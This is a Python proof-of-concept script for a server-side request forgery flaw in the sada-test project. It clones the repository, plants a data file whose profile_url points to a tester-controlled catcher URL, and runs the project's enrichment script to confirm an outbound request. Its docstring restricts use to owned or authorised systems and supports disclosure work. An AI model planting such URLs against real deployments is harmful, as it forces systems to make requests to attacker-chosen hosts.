#!/usr/bin/env python3
"""Real-internet end-to-end SSRF PoC for sada-test (waltfilipe/sada-test).

Same mechanism as poc_sada_ssrf.py, but the attacker URL is one YOU control on
the public internet (a request-catcher: webhook.site / interactsh / ngrok / your
own VPS). It plants that URL as a data-file profile_url, runs the REAL
`scripts/enrich_loan_status.py`, and the program fetches your URL over the real
network -- you confirm the hit in your catcher's dashboard.

ONLY point --target at infrastructure you own or are explicitly authorized to
test. The vulnerable program is sada-test (a clone you control); the request
destination must also be yours. Never aim this at third-party systems.

What it proves: the program makes an attacker-controlled outbound request to an
arbitrary host, end-to-end, over the real internet. It does NOT establish that a
remote attacker controls the data file on a real deployment -- that trust-boundary
question is a separate, human judgement.

    python3 poc_sada_ssrf_realnet.py --target https://webhook.site/<your-uuid>
"""
import argparse
import json
import subprocess
import sys
import tempfile
import uuid
from pathlib import Path

REPO = "https://github.com/waltfilipe/sada-test.git"


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True,
                    help="a request-catcher URL YOU control (webhook.site / interactsh / your VPS)")
    args = ap.parse_args()
    if "://" not in args.target:
        print("target must be a full URL you control, e.g. https://webhook.site/<uuid>")
        sys.exit(2)

    nonce = uuid.uuid4().hex[:12]
    sep = "&" if "?" in args.target else "?"
    target = f"{args.target}{sep}vulcan={nonce}"   # tag so you can spot THIS request

    work = Path(tempfile.mkdtemp(prefix="sada_realnet_"))
    clone = work / "repo"
    print(f"[*] cloning {REPO}")
    r = subprocess.run(["git", "clone", "--depth", "1", REPO, str(clone)],
                       capture_output=True, text=True)
    if r.returncode != 0:
        print("clone failed:", r.stderr[-300:]); sys.exit(1)

    data = clone / "data"
    data.mkdir(exist_ok=True)
    for f in data.glob("family-*.json"):          # park the repo's real data so the run is fast
        f.rename(f.with_suffix(".json.pocbak"))
    attack = {"players": [{"name": "pwn", "transfermarkt": {"profile_url": target}}]}
    (data / "family-attack.json").write_text(json.dumps(attack), encoding="utf-8")
    print(f"[*] planted profile_url -> {target}")
    print("[*] running the REAL scripts/enrich_loan_status.py (it will fetch your URL over the internet)")

    proc = subprocess.run([sys.executable, "scripts/enrich_loan_status.py"],
                          cwd=str(clone), capture_output=True, text=True, timeout=120)
    for line in (proc.stdout or "").splitlines()[:4]:
        print("    " + line)

    print()
    print(f"[+] done. Now check your catcher for a request tagged  vulcan={nonce}")
    print("    If it arrived: the program made a real, attacker-controlled outbound request")
    print("    across the internet to a host you chose -> SSRF confirmed end-to-end.")
    print("    (Disclosure still needs the trust-boundary check: who controls the data file in")
    print("     a real deployment. This PoC proves the data-flow, not that judgement.)")


if __name__ == "__main__":
    main()
